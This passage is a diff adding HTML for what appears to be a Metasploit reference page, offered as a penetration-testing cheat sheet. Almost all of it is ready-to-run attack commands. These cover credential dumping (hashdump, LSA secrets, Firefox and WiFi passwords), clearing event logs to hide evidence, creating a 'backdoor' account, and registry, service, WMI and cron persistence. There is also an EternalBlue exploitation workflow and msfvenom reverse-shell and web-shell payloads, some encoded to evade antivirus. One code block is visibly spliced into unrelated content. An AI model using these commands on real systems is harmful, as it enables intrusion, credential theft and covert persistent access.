@@ -1,0 +1,1435 @@
+                    <div class="code-block meterpreter-block">
+                        <span class="comment"># Network interface information</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">ipconfig</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">route</span><br><br>
+                        <span class="comment"># Port scanning from compromised host</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24</span><br><br>
+                        <span class="comment"># Netstat information</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">netstat</span><br><br>
+                        <span class="comment"># Portfwd for port forwarding</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">portfwd add -l 3389 -p 3389 -r 192.168.2.100</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">portfwd list</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">portfwd delete -l 3389</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Pivoting Setup</span>
+                        <span class="tag">Pivoting</span>
+                    </div>
+                    <div class="tool-description">
+                        Configure the compromised host as a pivot point to access internal networks.
+                    </div>
+                    <div class="code-block meterpreter-block">
+                        <span class="comment"># Add route through session</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run autoroute -s 192.168.2.0/24</span><br><br>
+                        <span class="comment"># Alternative route method</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">background</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/multi/manage/autoroute</span><br>
+                        <span class="msf-prompt">msf6 post(multi/manage/autoroute) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(multi/manage/autoroute) ></span> <span class="command">set SUBNET 192.168.2.0</span><br>
+                        <span class="msf-prompt">msf6 post(multi/manage/autoroute) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Setup SOCKS proxy</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use auxiliary/server/socks_proxy</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(server/socks_proxy) ></span> <span class="command">set SRVPORT 1080</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(server/socks_proxy) ></span> <span class="command">run -j</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="post-exploitation" class="section">
+            <h2>🔍 Post-Exploitation Modules</h2>
+            <p>Leverage Metasploit's extensive post-exploitation module library for comprehensive system analysis.</p>
+
+            <div class="tool-category">
+                <h3>📊 Information Gathering Modules</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>System Enumeration</span>
+                        <span class="tag">Enumeration</span>
+                    </div>
+                    <div class="tool-description">
+                        Use post-exploitation modules to gather comprehensive system information.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Windows system enumeration</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/enum_system</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_system) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_system) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Enumerate applications</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/enum_applications</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_applications) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_applications) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Check for UAC settings</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/enum_UAC</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_UAC) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_UAC) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Credential Gathering</span>
+                        <span class="tag">Credentials</span>
+                    </div>
+                    <div class="tool-description">
+                        Extract various types of credentials and authentication material from the system.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Dump password hashes</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/hashdump</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/hashdump) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/hashdump) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Gather cached credentials</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/cachedump</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/cachedump) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/cachedump) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Extract LSA secrets</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/lsa_secrets</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/lsa_secrets) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/lsa_secrets) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Smart card certificates</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/smart_hashdump</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/smart_hashdump) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/smart_hashdump) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Privilege Escalation Checks</span>
+                        <span class="tag">Privilege Escalation</span>
+                    </div>
+                    <div class="tool-description">
+                        Identify potential privilege escalation vectors and misconfigurations.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Local exploit suggester</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/multi/recon/local_exploit_suggester</span><br>
+                        <span class="msf-prompt">msf6 post(multi/recon/local_exploit_suggester) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(multi/recon/local_exploit_suggester) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Windows privilege escalation</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/escalate/getsystem</span><br>
+                        <span class="msf-prompt">msf6 post(windows/escalate/getsystem) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/escalate/getsystem) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Check for unquoted service paths</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/enum_unquoted_service_path</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_unquoted_service_path) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_unquoted_service_path) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tool-category">
+                <h3>🔒 Windows-Specific Modules</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Windows Registry Operations</span>
+                        <span class="tag">Registry</span>
+                    </div>
+                    <div class="tool-description">
+                        Manipulate Windows registry for persistence and information gathering.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Enumerate registry</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/gather/enum_registry</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_registry) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/gather/enum_registry) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Gather WiFi passwords</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/wlan/wlan_profile</span><br>
+                        <span class="msf-prompt">msf6 post(windows/wlan/wlan_profile) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/wlan/wlan_profile) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Extract browser data</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/multi/gather/firefox_creds</span><br>
+                        <span class="msf-prompt">msf6 post(multi/gather/firefox_creds) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(multi/gather/firefox_creds) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Event Log Management</span>
+                        <span class="tag">Stealth</span>
+                    </div>
+                    <div class="tool-description">
+                        Manipulate Windows event logs to cover tracks and remove evidence.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Clear event logs</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/manage/delete_win_eventlog</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/delete_win_eventlog) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/delete_win_eventlog) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Enable RDP</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/manage/enable_rdp</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/enable_rdp) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/enable_rdp) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Create user account</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/manage/add_user</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/add_user) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/add_user) ></span> <span class="command">set USERNAME backdoor</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/add_user) ></span> <span class="command">set PASSWORD P@ssw0rd123</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/add_user) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="persistence" class="section">
+            <h2>🏠 Persistence Techniques</h2>
+            <p>Establish persistent access to maintain control over compromised systems across reboots and updates.</p>
+
+            <div class="tool-category">
+                <h3>🔄 Windows Persistence</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Service-Based Persistence</span>
+                        <span class="tag">Services</span>
+                    </div>
+                    <div class="tool-description">
+                        Create Windows services for persistent access that survives system reboots.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Create service persistence</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/manage/persistence_exe</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/persistence_exe) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/persistence_exe) ></span> <span class="command">set REXEPATH /path/to/backdoor.exe</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/persistence_exe) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Meterpreter service persistence</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run persistence -S -U -X -i 10 -p 4445 -r 192.168.1.10</span><br><br>
+                        <span class="comment"># VNC persistence</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/manage/vncstart</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/vncstart) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/vncstart) ></span> <span class="command">set PASSWORD vnc123</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/vncstart) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Registry Persistence</span>
+                        <span class="tag">Registry</span>
+                    </div>
+                    <div class="tool-description">
+                        Use Windows registry autorun locations for persistent payload execution.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Registry autorun persistence</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run persistence -A -L c:\\ -P windows/meterpreter/reverse_tcp -p 4446 -r 192.168.1.10</span><br><br>
+                        <span class="comment"># Manual registry persistence</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">reg setval -k HKCU\\software\\microsoft\\windows\\currentversion\\run -v backdoor -d 'C:\temp\backdoor.exe'</span><br><br>
+                        <span class="comment"># Schedule task persistence</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/manage/schtask</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/schtask) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/schtask) ></span> <span class="command">set CMD c:\\temp\\backdoor.exe</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/schtask) ></span> <span class="command">set TASKNAME SystemUpdate</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/schtask) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>WMI Persistence</span>
+                        <span class="tag">WMI</span>
+                    </div>
+                    <div class="tool-description">
+                        Use Windows Management Instrumentation for stealthy persistence mechanisms.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># WMI event subscription persistence</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/windows/manage/wmi_persistence</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/wmi_persistence) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/wmi_persistence) ></span> <span class="command">set EVENTNAME SystemUpdate</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/wmi_persistence) ></span> <span class="command">set PAYLOAD windows/meterpreter/reverse_tcp</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/wmi_persistence) ></span> <span class="command">set LHOST 192.168.1.10</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/wmi_persistence) ></span> <span class="command">set LPORT 4447</span><br>
+                        <span class="msf-prompt">msf6 post(windows/manage/wmi_persistence) ></span> <span class="command">run</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tool-category">
+                <h3>🐧 Linux Persistence</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Cron Job Persistence</span>
+                        <span class="tag">Scheduled Tasks</span>
+                    </div>
+                    <div class="tool-description">
+                        Use cron jobs for scheduled execution of persistent payloads on Linux systems.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Cron persistence module</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/linux/manage/cron_persistence</span><br>
+                        <span class="msf-prompt">msf6 post(linux/manage/cron_persistence) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(linux/manage/cron_persistence) ></span> <span class="command">set TIMING @reboot</span><br>
+                        <span class="msf-prompt">msf6 post(linux/manage/cron_persistence) ></span> <span class="command">set PAYLOAD linux/x86/meterpreter/reverse_tcp</span><br>
+                        <span class="msf-prompt">msf6 post(linux/manage/cron_persistence) ></span> <span class="command">set LHOST 192.168.1.10</span><br>
+                        <span class="msf-prompt">msf6 post(linux/manage/cron_persistence) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Manual cron persistence from meterpreter</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">shell</span><br>
+                        <span class="output">$</span> <span class="command">echo "*/5 * * * * /tmp/.hidden/backdoor" | crontab -</span><br>
+                        <span class="output">$</span> <span class="command">exit</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="pivoting" class="section">
+            <h2>🔄 Advanced Pivoting Techniques</h2>
+            <p>Use compromised systems as stepping stones to access internal networks and additional targets.</p>
+
+            <div class="tool-category">
+                <h3>🌐 Network Routing</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Autoroute Configuration</span>
+                        <span class="tag">Routing</span>
+                    </div>
+                    <div class="tool-description">
+                        Configure automatic routing through compromised hosts to reach internal networks.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Add routes via Meterpreter</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run autoroute -s 192.168.2.0/24</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run autoroute -s 10.0.0.0/16</span><br><br>
+                        <span class="comment"># View current routes</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run autoroute -p</span><br><br>
+                        <span class="comment"># Use post module for routing</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use post/multi/manage/autoroute</span><br>
+                        <span class="msf-prompt">msf6 post(multi/manage/autoroute) ></span> <span class="command">set SESSION 1</span><br>
+                        <span class="msf-prompt">msf6 post(multi/manage/autoroute) ></span> <span class="command">set SUBNET 192.168.2.0</span><br>
+                        <span class="msf-prompt">msf6 post(multi/manage/autoroute) ></span> <span class="command">set NETMASK 255.255.255.0</span><br>
+                        <span class="msf-prompt">msf6 post(multi/manage/autoroute) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Delete routes</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">run autoroute -d 192.168.2.0/24</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>SOCKS Proxy Setup</span>
+                        <span class="tag">Proxy</span>
+                    </div>
+                    <div class="tool-description">
+                        Create SOCKS proxy through compromised systems for external tool usage.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Setup SOCKS4a proxy</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use auxiliary/server/socks4a</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(server/socks4a) ></span> <span class="command">set SRVPORT 1080</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(server/socks4a) ></span> <span class="command">run -j</span><br><br>
+                        <span class="comment"># Alternative: SOCKS5 proxy</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use auxiliary/server/socks_proxy</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(server/socks_proxy) ></span> <span class="command">set VERSION 5</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(server/socks_proxy) ></span> <span class="command">set SRVPORT 1080</span><br>
+                        <span class="msf-prompt">msf6 auxiliary(server/socks_proxy) ></span> <span class="command">run -j</span><br><br>
+                        <span class="comment"># Use proxy with external tools</span><br>
+                        <span class="command">proxychains nmap -sT 192.168.2.100</span><br>
+                        <span class="command">proxychains firefox</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Port Forwarding</span>
+                        <span class="tag">Port Forward</span>
+                    </div>
+                    <div class="tool-description">
+                        Forward specific ports through compromised systems to access internal services.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Local port forwarding (from meterpreter)</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">portfwd add -l 3389 -p 3389 -r 192.168.2.100</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">portfwd add -l 8080 -p 80 -r 192.168.2.50</span><br><br>
+                        <span class="comment"># List active port forwards</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">portfwd list</span><br><br>
+                        <span class="comment"># Delete port forward</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">portfwd delete -l 3389</span><br><br>
+                        <span class="comment"># Connect to forwarded service</span><br>
+                                                <span class="comment"># Search by CVE number</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search cve:2017-0144</span><br><br>
+                        <span class="comment"># Search by platform</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search platform:windows</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search platform:linux</span><br><br>
+                        <span class="comment"># Search by type</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search type:exploit</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search type:auxiliary</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search type:post</span><br><br>
+                        <span class="comment"># Combined search criteria</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">search platform:windows type:exploit smb</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Module Information and Usage</span>
+                        <span class="tag">Information</span>
+                    </div>
+                    <div class="tool-description">
+                        Get detailed information about modules and understand their requirements before execution.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Use a module</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">use exploit/windows/smb/ms17_010_eternalblue</span><br><br>
+                        <span class="comment"># Show module information</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">info</span><br><br>
+                        <span class="comment"># Show required options</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">show options</span><br><br>
+                        <span class="comment"># Show advanced options</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">show advanced</span><br><br>
+                        <span class="comment"># Show compatible payloads</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">show payloads</span><br><br>
+                        <span class="comment"># Show targets</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">show targets</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Setting Options and Variables</span>
+                        <span class="tag">Configuration</span>
+                    </div>
+                    <div class="tool-description">
+                        Configure module options and set global variables for efficient workflow.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Set required options</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">set RHOSTS 192.168.1.100</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">set LHOST 192.168.1.10</span><br><br>
+                        <span class="comment"># Set payload</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">set payload windows/x64/meterpreter/reverse_tcp</span><br><br>
+                        <span class="comment"># Set global variables</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">setg RHOSTS 192.168.1.0/24</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">setg LHOST 192.168.1.10</span><br><br>
+                        <span class="comment"># Unset variables</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">unset RHOSTS</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">unsetg LHOST</span><br><br>
+                        <span class="comment"># Show current variables</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">show options</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tool-category">
+                <h3>🎯 Exploitation Workflow</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Target Verification and Exploitation</span>
+                        <span class="tag">Execution</span>
+                    </div>
+                    <div class="tool-description">
+                        Verify target vulnerability and execute exploits safely and effectively.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Check if target is vulnerable</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">check</span><br><br>
+                        <span class="comment"># Run the exploit</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">exploit</span><br>
+                        <span class="comment"># Alternative: run command</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">run</span><br><br>
+                        <span class="comment"># Run in background</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">exploit -j</span><br><br>
+                        <span class="comment"># Set specific target</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">set TARGET 1</span><br>
+                        <span class="msf-prompt">msf6 exploit(windows/smb/ms17_010_eternalblue) ></span> <span class="command">exploit</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Session Management</span>
+                        <span class="tag">Sessions</span>
+                    </div>
+                    <div class="tool-description">
+                        Manage active sessions from successful exploitations and interact with compromised systems.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># List active sessions</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">sessions</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">sessions -l</span><br><br>
+                        <span class="comment"># Interact with session</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">sessions -i 1</span><br><br>
+                        <span class="comment"># Background current session</span><br>
+                        <span class="meterpreter-prompt">meterpreter ></span> <span class="command">background</span><br><br>
+                        <span class="comment"># Kill session</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">sessions -k 1</span><br><br>
+                        <span class="comment"># Kill all sessions</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">sessions -K</span><br><br>
+                        <span class="comment"># Upgrade session to meterpreter</span><br>
+                        <span class="msf-prompt">msf6 ></span> <span class="command">sessions -u 1</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="payloads" class="section">
+            <h2>💣 Payload Generation and Management</h2>
+            <p>Master payload creation using msfvenom and understand different payload types for various scenarios.</p>
+
+            <div class="tool-category">
+                <h3>🛠️ MSFVenom Payload Generation</h3>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Windows Payloads</span>
+                        <span class="tag">Windows</span>
+                    </div>
+                    <div class="tool-description">
+                        Generate various Windows payloads for different delivery methods and evasion techniques.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Basic Windows reverse shell</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe</span><br><br>
+                        <span class="comment"># Windows 64-bit payload</span><br>
+                        <span class="command">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell64.exe</span><br><br>
+                        <span class="comment"># Encoded payload (bypass AV)</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_shell.exe</span><br><br>
+                        <span class="comment"># PowerShell payload</span><br>
+                        <span class="command">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f powershell > shell.ps1</span><br><br>
+                        <span class="comment"># DLL payload</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll > shell.dll</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Linux Payloads</span>
+                        <span class="tag">Linux</span>
+                    </div>
+                    <div class="tool-description">
+                        Create Linux-compatible payloads for different architectures and delivery methods.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># Linux x86 reverse shell</span><br>
+                        <span class="command">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell</span><br><br>
+                        <span class="comment"># Linux x64 payload</span><br>
+                        <span class="command">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell64</span><br><br>
+                        <span class="comment"># Python payload</span><br>
+                        <span class="command">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f python > shell.py</span><br><br>
+                        <span class="comment"># Bash script payload</span><br>
+                        <span class="command">msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.10 LPORT=4444 -f raw > shell.sh</span><br><br>
+                        <span class="comment"># PHP payload</span><br>
+                        <span class="command">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.php</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Web Application Payloads</span>
+                        <span class="tag">Web</span>
+                    </div>
+                    <div class="tool-description">
+                        Generate payloads specifically designed for web application exploitation and file upload vulnerabilities.
+                    </div>
+                    <div class="code-block">
+                        <span class="comment"># JSP payload for Java web apps</span><br>
+                        <span class="command">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war > shell.war</span><br><br>
+                        <span class="comment"># ASP payload for IIS</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp > shell.asp</span><br><br>
+                        <span class="comment"># ASPX payload</span><br>
+                        <span class="command">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f aspx > shell.aspx</span><br><br>
+                        <span class="comment"># PHP web shell</span><br>
+                        <span class="command">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > webshell.php</span><br><br>
+                        <span class="comment"># Python CGI payload</span><br>
+                        <span class="command">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.py</span>
+                    </div>
+                </div>
+
+                <div class="tool-item">
+                    <div class="tool-name">
+                        <span>Advanced Payload Techniques</span>
+                        <span class="tag">Advanced</span>
+                    </div>
+                    <div class="tool-description">
+                        Advanced payload generation techniques including templates, encoding, and format manipulation.
